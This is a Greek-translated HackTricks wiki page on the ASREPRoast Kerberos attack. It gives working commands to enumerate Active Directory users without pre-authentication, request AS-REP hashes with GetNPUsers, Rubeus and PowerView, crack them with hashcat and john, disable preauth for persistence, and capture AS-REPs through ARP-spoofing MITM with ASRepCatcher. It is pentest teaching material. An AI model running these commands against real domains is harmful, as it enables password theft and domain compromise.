# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες που δεν έχουν το **απαιτούμενο χαρακτηριστικό προ-αυθεντικοποίησης Kerberos**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους επιτιθέμενους να ζητούν αυθεντικοποίηση για έναν χρήστη από τον Domain Controller (DC) χωρίς να χρειάζεται ο κωδικός πρόσβασης του χρήστη. Ο DC απαντά στη συνέχεια με ένα μήνυμα κρυπτογραφημένο με το κλειδί που προέρχεται από τον κωδικό πρόσβασης του χρήστη, το οποίο οι επιτιθέμενοι μπορούν να προσπαθήσουν να σπάσουν εκτός σύνδεσης για να ανακαλύψουν τον κωδικό πρόσβασης του χρήστη.

Οι κύριες απαιτήσεις για αυτήν την επίθεση είναι:

* **Έλλειψη προ-αυθεντικοποίησης Kerberos**: Οι στοχοθετημένοι χρήστες δεν πρέπει να έχουν ενεργοποιημένο αυτό το χαρακτηριστικό ασφαλείας.
* **Σύνδεση με τον Domain Controller (DC)**: Οι επιτιθέμενοι χρειάζονται πρόσβαση στον DC για να στείλουν αιτήματα και να λάβουν κρυπτογραφημένα μηνύματα.
* **Προαιρετικός λογαριασμός τομέα**: Η ύπαρξη λογαριασμού τομέα επιτρέπει στους επιτιθέμενους να εντοπίζουν πιο αποτελεσματικά ευάλωτους χρήστες μέσω LDAP ερωτημάτων. Χωρίς έναν τέτοιο λογαριασμό, οι επιτιθέμενοι πρέπει να μαντέψουν τα ονόματα χρηστών.

#### Enumerating vulnerable users (need domain credentials)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Χρησιμοποιώντας το Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτημα μηνύματος AS\_REP

{% code title="Using Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Χρησιμοποιώντας τα Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Η εκτέλεση του AS-REP Roasting με το Rubeus θα δημιουργήσει ένα 4768 με τύπο κρυπτογράφησης 0x17 και τύπο προαυτοποίησης 0.
{% endhint %}

### Σπάσιμο
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Επιμονή

Αναγκάστε **preauth** να μην απαιτείται για έναν χρήστη όπου έχετε **GenericAll** δικαιώματα (ή δικαιώματα για να γράψετε ιδιότητες):

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Χρησιμοποιώντας Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast χωρίς διαπιστευτήρια

Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει μια θέση man-in-the-middle για να συλλάβει τα πακέτα AS-REP καθώς διασχίζουν το δίκτυο χωρίς να βασίζεται στην απενεργοποίηση της προ-αυθεντικοποίησης Kerberos. Επομένως, λειτουργεί για όλους τους χρήστες στο VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε αυτό. Επιπλέον, το εργαλείο αναγκάζει τους πελάτες σταθμούς εργασίας να χρησιμοποιούν RC4 τροποποιώντας τη διαπραγμάτευση Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Συμμετάσχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς bug bounty!

**Ενημερώσεις Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εμβαθύνει στην αδρεναλίνη και τις προκλήσεις του hacking

**Νέα Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον ταχύτατο κόσμο του hacking μέσω ειδήσεων και πληροφοριών σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις πιο πρόσφατες εκκινήσεις bug bounties και κρίσιμες ενημερώσεις πλατφόρμας

**Συμμετάσχετε μαζί μας στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και ξεκινήστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
